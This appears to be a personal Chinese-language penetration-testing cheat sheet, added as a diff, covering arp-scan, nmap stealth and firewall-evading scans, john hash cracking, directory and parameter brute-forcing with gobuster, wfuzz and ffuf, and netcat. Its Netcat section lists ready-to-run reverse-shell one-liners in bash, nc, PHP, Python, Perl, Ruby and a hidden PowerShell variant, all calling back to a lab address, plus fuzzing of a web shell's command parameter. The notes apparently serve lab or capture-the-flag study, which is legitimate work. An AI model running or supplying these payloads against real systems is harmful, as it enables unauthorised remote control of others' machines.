@@ -1,0 +1,159 @@
+## arp-scan
+
+利用arp找到存活的主机并收集其网络信息
+
+```bash
+#-I指定扫描哪个网卡连接到的网络的设备，-l指定扫描本计算机所在的网络中
+sudo arp-scan -l -I eth0
+sudo arp-scan -I eth0 ip(or IPCIDR)
+```
+
+## nmap
+
+探测端口是否开放，默认会先ping确定主机是否存活，避免对主机进行不必要的端口扫描，可能有些防火墙禁ping，因此一般用-Pn来避免nmap用ping探测主机存活状态，而用arp-scan探测主机存活状态。
+
+```bash
+#SYN扫描（半开放扫描、隐身扫描）
+主要用于扫描端口开放状态。
+发送一个SYN表示请求建立连接，如果目标端口关闭会回复RST数据包，开放会响应SYN/ACK数据包，如果数据包被防火墙阻挡或过滤器阻挡（此时就不知道这个端口是否开放了），会返回一个ICMP错误消息（一般为端口不可达）。nmap如果收到了相应的SYN/ACK数据包会马上回复一个RST，避免建立连接。
+#ACK扫描
+主要用于检测防火墙和过滤器是否存在。
+在未建立连接时发送ACK报文，如果被防火墙和过滤器阻挡会返回一个ICMP错误消息，否则无论是否开放端口都会返回一个RST数据包。
+#UDP扫描
+默认用TCP扫描，UDP扫描不准确。因此UDP扫描没有确认机制，UDP扫描在端口关闭和存在防火墙过滤器的情况下都会返回一个ICMP错误消息（因此无法判断是否端口开放），在开放的情况下没有任何回复（除非有对udp包回应的应用层代码）。
+#FIN扫描
+一般用于绕过防火墙和过滤器阻挡进行端口检测。
+因为防火墙和过滤器对FIN的检测不如对SYN的检测严格，开放的端口会忽略FIN，关闭的端口会响应一个RST数据包。
+#Xmas扫描
+一般用于绕过防火墙和过滤器阻挡进行端口检测。
+同FIN扫描，但还设置了FIN、URG和PSH标志，开放的端口会忽略FIN，关闭的端口会响应一个RST数据包。
+#NULL扫描
+一般用于绕过防火墙和过滤器阻挡进行端口检测。
+发送一个不设置任何标志的数据包，因为防火墙和过滤器可能不会过滤和处理这种不设置任何标志的数据包，开放的端口会忽略，关闭的端口会响应一个RST数据包。
+```
+
+```bash
+#小写-s代表scan，-Pn代表no ping，-p-代表所有1-65536所有端口，-p指定扫描的端口，-iL指定扫描某个文件的所有ip
+sudo nmap -sS -Pn -p- 192.168.6.166
+```
+
+## john(类似hashcat)
+
+##### libreoffice2john，用于提取加密文档的hash
+
+```bash
+libreoffice2john 目标文件 > 输出文件
+```
+
+##### john用于破解密码hash,主要靠爆破，因此需要字典（john会自动识别hash类型，但是可能会失败，因此需要hash-identifier、hashid)
+
+```bash
+#john可以破解的加密算法
+#MD4、MD5、SHA1、NTLM等
+```
+
+```bash
+#f代表format可以省略，w代表wordlist
+john -f=加密类型 -w=字典 目标文件
+```
+
+## hashid
+
+## gobuster
+
+向服务器发送http请求，尝试访问路径并根据相应确定路径是否存在（爆破网站目录）
+
+```bash
+#
+#dir参数用于目录和文件枚举，-x代表指定爆破的扩展文件名，和字典的内容组合实现爆破
+gobuster dir -u 'http://192.168.6.166/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
+```
+
+## wfuzz
+
+使用模糊测试的方法爆破路径，例如已知存在路径/scout/xxx/docs/，要获得xxx
+
+```bash
+#用FUZZ作为通配符进行模糊测试,hc即hide code隐藏404响应,hl为hide length
+wfuzz -c -t 200 -u 'http://192.168.6.166/scout/FUZZ/docs/' -w /usr/share/wordlists/dirb/big.txt --hc=404 --hl 3
+```
+
+## ffuf
+
+使用模糊测试的方法爆破URL参数
+
+```bash
+#FUZZ作为通配符进行模糊测试
+
+#爆破参数名
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?FUZZ=whoami' -fw 1
+#爆破参数值
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?a=whoami&b=FUZZ' -fw 1
+```
+
+## Netcat
+
+在一台服务器上监听某个端口后，在靶机上请求向该ip端口建立连接（反弹shell）
+
+也可以探测某ip端口是否开放和是否运行服务
+
+netcat使用TCP和UDP建立连接，默认使用TCP
+
+```bash
+#探测某ip端口是否开放和是否运行服务
+┌──(dxt㉿kali)-[~]
+└─$ nc 192.168.6.178 22
+SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+#监听本机某ip的某端口,可以不加ip，l代表listen，v代表verbose，p代表port
+nc -lvp (127.0.0.1) 5555
+
+#建立反向连接
+bash -i >& /dev/tcp/192.168.6.149/5555 0>&1
+
+#或者使用nc
+nc 192.168.6.149 5555 -e /bin/bash
+#然后用srcipt启动一个新的bash shell
+script /dev/null -c bash
+
+#或者php
+php -r '$sock=fsockopen("192.168.6.149",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#或者python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.149",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#或者perl
+perl -e 'use Socket;$i="192.168.6.149";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#或者ruby
+ruby -rsocket -e'f=TCPSocket.open("192.168.6.149",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+#或者windows powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.6.149",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+#以上都不能用的时候只能看能不能进行文件上传，上传一个服务器支持的语言的反向连接代码然后运行
+```
+
+html一般没有普通用户写权限，但是tmp有
+
+
+
+为什么php文件不显示网页？因为php文件需要？传参才可以访问
+
+
+
+
+
+
+
+```bash
+为什么我给a赋值bash -i >& /dev/tcp/192.168.6.149/6666 0>&1时，不会建立反向连接。但是我给a赋值nc 192.168.6.149 5555 -e /bin/bash在kali上获取到www-data的shell后，在www-data的shell中运行这个命令却可以建立一个反向连接。我看thejabasshell.php文件中也没有额外的代码防护。
+
+相应的端口都是处于监听状态的，即5555和6666都监听了。我本来以为是www-data权限问题无法访问/dev，但是获取到www-data的shell后却可以在建立一个反向连接，
+```
+
+![image-20240621152546677](ToolsHub.assets/image-20240621152546677.png)
+
+![image-20240621152610218](ToolsHub.assets/image-20240621152610218.png)
+
+![image-20240621152125187](ToolsHub.assets/image-20240621152125187.png)
+
+![image-20240621152106313](ToolsHub.assets/image-20240621152106313.png)
